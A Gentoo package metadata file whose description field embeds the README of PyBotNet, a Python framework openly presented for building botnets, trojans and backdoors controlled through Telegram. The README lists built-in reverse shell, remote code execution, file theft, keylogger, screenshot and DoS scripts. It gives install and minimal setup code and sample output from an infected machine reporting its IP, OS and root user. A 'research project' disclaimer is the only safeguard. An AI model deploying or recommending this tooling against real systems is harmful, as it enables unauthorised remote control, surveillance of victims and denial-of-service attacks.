<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE pkgmetadata SYSTEM "http://www.gentoo.org/dtd/metadata.dtd">
<pkgmetadata>
	<maintainer type="person">
		<email>gentoo@houseofsuns.org</email>
		<name>Markus Walter</name>
	</maintainer>
	<longdescription> &lt;p align=&quot;center&quot;&gt;    &lt;a href='https://github.com/onionj/pybotnet' target='_blank'&gt;&lt;img src='https://files.virgool.io/upload/users/271869/posts/wxs2bk9hkqfx/ezoxwssoikqm.jpeg' border='5' alt='trojan horse'/&gt;&lt;/a&gt;    &lt;h1 align=&quot;center&quot;&gt;PyBotNet&lt;/h1&gt;    &lt;p align=&quot;center&quot;&gt;     A Python framework for building &lt;b&gt;remote control&lt;/b&gt;, &lt;b&gt;botnet&lt;/b&gt; , &lt;b&gt;trojan&lt;/b&gt;  or &lt;b&gt;backdoor&lt;/b&gt; with Telegram or other control panels    &lt;/p&gt;  &lt;p align=&quot;center&quot;&gt;    &lt;a href=&quot;https://github.com/onionj/pybotnet&quot;&gt;      &lt;img src=&quot;https://img.shields.io/pypi/v/pybotnet?label=pybotnet&quot; /&gt;    &lt;/a&gt;    &lt;a href=&quot;https://github.com/onionj/pybotnet/blob/master/LICENSE&quot;&gt;      &lt;img src=&quot;https://img.shields.io/github/license/onionj/pybotnet&quot; /&gt;    &lt;/a&gt;    &lt;a href=&quot;https://www.python.org/&quot;&gt;    &lt;img src=&quot;https://img.shields.io/pypi/pyversions/pybotnet&quot; /&gt;    &lt;/a&gt;  &lt;/p&gt;&lt;/p&gt; &gt; Disclaimer: Please note that this is a research project. I am by no means responsible for any usage of this tool. Use it on your behalf!. ---**Source Code**: &lt;a href=&quot;https://github.com/onionj/pybotnet&quot; target=&quot;_blank&quot;&gt;https://github.com/onionj/pybotnet&lt;/a&gt;**Documentation**: &lt;a href=&quot;https://onionj.github.io/pybotnet/&quot; target=&quot;_blank&quot;&gt;https://onionj.github.io/pybotnet/&lt;/a&gt;**ToDo List**: &lt;a href=&quot;https://github.com/users/onionj/projects/1&quot; target=&quot;_blank&quot;&gt;https://github.com/users/onionj/projects/1&lt;/a&gt;---### Features:* Built in Telegram control pannel and proxy* Built in scripts like:    * reverse shell    * put or get file    * run python code on target systems    * get screenshot    * keylogger    * dos    * scheduler    * ...* Cross platform* Ability to easily add custom scripts* Import external scripts* Ability to add custom control panel* Add remote control to your apps* [...](https://onionj.github.io/pybotnet/)### Install PyBotNet```consolepip3 install pybotnet -U```* `-U`: make sure to upgrade framework to latest version.#### The simplest PyBotNet file could look like this:```py title=&quot;main.py&quot;# in main.pyfrom pybotnet import BotNet, TelegramEnginetelegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID) #(1)botnet = BotNet(telegram_engine) # (2)botnet.run()```1. create engine: Engines transfer messages between admin and botnet2. create BotNet instance#### note:  * `TELEGRAM_TOKEN`: You can use telegram `@botfather` to Create new telegram API Bot and get your `TELEGRAM_TOKEN`   * `ADMIN_CHAT_ID`: Get it from @userinfobot telegram bot  * PyBotNet include default scripts, like: `/shell`, `/put_file`, `/get_file`, `/screenshot`, `/who`, ...,    you can send `/help` to your telegram bot and see more detail..#### Run code:```console python3 main.py```#### telegram engineopen telegram and send `/who` to your bot; If you have done the steps correctly, you recive message like this:```scripts_name:    echo    who    shell    screenshot    put_file    get_file    runcode    openurl    dos    schedulemac_addres: 228362405364os: Linuxglobal_ip: 5.10.30.35country: Iran, Islamic Republic ofbot_name: no_namelocal_ip: {'192.168.23.1'}host_name: {'system_name'}system_user: rootup_time: 0:00:01current_route: /pid: 148352cpu_count: 8pybotnet_version: 2.0.8b0from cache: True```you can send `/help` to see help page, or send `/help &lt;script_name&gt;` to recive more help about specific script.for example send `/help screenshot`, You will receive:```NAME:screenshotDESCRIPTION:get screen shot    * `[mac-address] /screenshot`    or    * `/screenshot`    example command:         * `94945035671481 /screenshot`        * `/screenshot`     return: img or img-download-link    script_version: 0.0.1default_script: True___________________________scripts_name: ['echo', 'who', 'shell', 'screenshot', 'put_file', 'get_file', 'runcode', 'openurl', 'dos', 'schedule']mac_addres: 228362405364os: Linuxglobal_ip: 5.10.30.35country: Iran, Islamic Republic ofbot_name: no_nameuse_proxy: False```in top of message you see script name, description, syntax and examples.for run screenshot script you have two choice:* Run the script on all clients that are listening to Telegram bot (for now we have one!)* Run script on one specific systemfor run script on all client send `/screenshot`.bot if you need get screen shot on specific system you need send `[mac_addres] /screenshot` for our case: `228362405364 /screenshot`in some case like `/shell` you need to run it just for one system.### *For more, see [Documentation](https://onionj.github.io/pybotnet/)*---## Contributors âœ¨Thanks goes to these wonderful people :&lt;table&gt;&lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/TorhamDev&quot;&gt;&lt;img src=&quot;https://avatars.githubusercontent.com/u/87639984?v=4&quot; width=&quot;70px;&quot; alt=&quot;&quot;/&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt; TorhamDev&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;br /&gt;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/SepehrRasouli&quot;&gt;&lt;img src=&quot;https://avatars.githubusercontent.com/u/81516241?v=4&quot; width=&quot;70px;&quot; alt=&quot;&quot;/&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt; SepehrRasouli&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;br /&gt;&lt;/td&gt;&lt;/table&gt;</longdescription>
</pkgmetadata>